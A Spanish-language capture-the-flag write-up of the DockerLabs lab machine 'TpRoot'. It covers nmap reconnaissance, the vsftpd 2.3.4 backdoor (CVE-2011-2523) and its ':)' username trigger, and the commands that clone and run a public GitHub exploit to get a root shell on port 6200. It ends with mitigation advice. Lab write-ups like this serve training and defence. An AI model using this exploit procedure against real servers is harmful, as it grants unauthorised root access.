# TpRoot

> El puerto FTP corre vsftpd 2.3.4, una versión con una puerta trasera conocida (CVE-2011-2523). La exploto con un exploit público de GitHub que da shell de root directa.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 21/tcp (FTP), 80/tcp (HTTP) |
| **Saltos de usuario** | 1 |

**Tags:** `FTP` · `vsftpd` · `Backdoor` · `CVE-2011-2523` · `Exploit` · `pwntools`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

La web es la página por defecto de Apache (nada interesante). Lo que canta es el FTP: **vsftpd 2.3.4**, una versión con una backdoor histórica y muy conocida.

## Explotación · backdoor de vsftpd 2.3.4

> **Nota.** En 2011 el código fuente de vsftpd 2.3.4 fue troyanizado: si en el login mandas un usuario terminado en `:)`, el servicio abre un shell de root escuchando en el puerto 6200 (CVE-2011-2523). Se puede explotar con Metasploit, pero para una máquina tan sencilla un exploit de GitHub es más directo y transparente.

Preparo un entorno virtual con pwntools, clono el exploit y lo lanzo contra el objetivo.

```bash
$ python3 -m venv venv && source venv/bin/activate
$ pip install pwntools
$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
$ cd vsftpd_2.3.4_Exploit && chmod +x exploit.py
$ python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
```

El exploit dispara la backdoor y me conecta al shell del puerto 6200, que ya es root: no hace falta escalar. Máquina TpRoot completada.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Backdoor en vsftpd 2.3.4 (CVE-2011-2523)

`CWE-506` · A06:2021 – Vulnerable and Outdated Components

**Impacto.** Esta versión de vsftpd contiene una puerta trasera: enviar un usuario acabado en ':)' abre un shell de root en el puerto 6200, sin autenticación.

**Mitigación.** Actualizar vsftpd a una versión parcheada y verificar la integridad del software instalado desde fuentes de confianza.

---

_Writeup de **TpRoot** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
